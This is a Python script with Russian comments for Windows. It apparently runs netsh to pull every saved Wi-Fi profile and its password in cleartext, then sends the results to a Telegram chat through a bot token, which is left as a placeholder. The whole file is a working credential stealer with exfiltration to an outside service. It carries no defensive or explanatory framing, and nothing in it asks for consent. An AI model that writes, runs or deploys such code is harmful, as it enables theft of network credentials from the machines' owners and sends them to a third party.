import subprocess
import re
import telegram
import asyncio
import logging

# Настройка логирования
logging.basicConfig(filename='wifi_debug.log', level=logging.DEBUG, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Конфиг
BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА"  # Тот же, что у бота
BOT_CHAT_ID = "CHAT_ID_БОТА"  # ID чата бота, узнай через @userinfobot, начав диалог с ботом

async def send_to_telegram(message):
    try:
        logging.info("Попытка отправки в Telegram")
        bot = telegram.Bot(token=BOT_TOKEN)
        await bot.send_message(chat_id=BOT_CHAT_ID, text=message)
        logging.info("Сообщение отправлено")
        return True
    except Exception as e:
        logging.error(f"Ошибка отправки: {str(e)}")
        return False

def decode_output(data):
    try:
        return data.decode('utf-8').split('\n')
    except UnicodeDecodeError:
        logging.warning("Ошибка UTF-8, пробуем cp866")
        return data.decode('cp866', errors='ignore').split('\n')

def get_current_wifi():
    try:
        logging.info("Проверка текущей Wi-Fi сети")
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], stderr=subprocess.STDOUT)
        data = decode_output(output)
        for line in data:
            if any(keyword in line for keyword in ["SSID", "Имя SSID"]):
                ssid = re.split(":", line, 1)[1].strip()
                logging.info(f"Текущая сеть: {ssid}")
                return ssid
        return None
    except Exception as e:
        logging.error(f"Ошибка проверки сети: {str(e)}")
        return None

def get_wifi_passwords():
    try:
        logging.info("Запуск netsh wlan show profiles")
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], stderr=subprocess.STDOUT)
        data = decode_output(meta_data)
        logging.info(f"Сырой вывод netsh: {data}")
        
        profiles = []
        for line in data:
            if any(keyword in line for keyword in ["All User Profile", "Все пользовательские профили", "Профиль всех пользователей"]):
                try:
                    profile_name = re.split(":", line, 1)[1].strip()
                    profiles.append(profile_name)
                except IndexError:
                    logging.warning(f"Не удалось разобрать: {line}")
                    continue
        
        current_ssid = get_current_wifi()
        if current_ssid and current_ssid not in profiles:
            profiles.append(current_ssid)
            logging.info(f"Добавлена текущая сеть: {current_ssid}")
        
        if not profiles:
            logging.warning("Профили не найдены")
            try:
                adapter_check = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], stderr=subprocess.STDOUT)
                adapter_data = decode_output(adapter_check)
                logging.info(f"Вывод interfaces: {adapter_data}")
                if any("is not running" in line or "не запущен" in line for line in adapter_data):
                    return "Wi-Fi адаптер не активен. Включи Wi-Fi."
                return f"Профили не найдены.\nТекущая сеть: {current_ssid if current_ssid else 'не подключено'}\nПодключись с 'Подключаться автоматически'."
            except Exception as e:
                logging.error(f"Ошибка адаптера: {str(e)}")
                return f"Ошибка адаптера: {str(e)}"
        
        logging.info(f"Найдено профилей: {len(profiles)}: {profiles}")
        
        wifi_data = f"Текущая сеть: {current_ssid if current_ssid else 'не подключено'}\n\nWi-Fi пароли:\n\n"
        for profile in profiles:
            try:
                logging.info(f"Получение пароля для: {profile}")
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', f'name="{profile}"', 'key=clear'], 
                    stderr=subprocess.STDOUT
                )
                results = decode_output(results)
                password = [line.split(":", 1)[1].strip() for line in results if any(keyword in line for keyword in ["Key Content", "Содержимое ключа"])]
                wifi_data += f"Wi-Fi: {profile}\nПароль: {password[0] if password else '<нет>'}\n\n"
            except subprocess.CalledProcessError as e:
                error_msg = decode_output(e.output)[0] if e.output else str(e)
                logging.error(f"Ошибка профиля {profile}: {error_msg}")
                wifi_data += f"Wi-Fi: {profile}\nОшибка: {error_msg}\n\n"
            except Exception as e:
                logging.error(f"Неизвестная ошибка {profile}: {str(e)}")
                wifi_data += f"Wi-Fi: {profile}\nОшибка: {str(e)}\n\n"
        
        return wifi_data
    except subprocess.CalledProcessError as e:
        error_msg = decode_output(e.output)[0] if e.output else str(e)
        logging.error(f"Ошибка netsh: {error_msg}")
        return f"Ошибка Wi-Fi: {error_msg}. Проверь 'netsh wlan show profiles' в CMD."
    except Exception as e:
        logging.error(f"Общая ошибка: {str(e)}")
        return f"Ошибка: {str(e)}"

async def main():
    wifi_info = get_wifi_passwords()
    await send_to_telegram(wifi_info)

if __name__ == "__main__":
    asyncio.run(main())
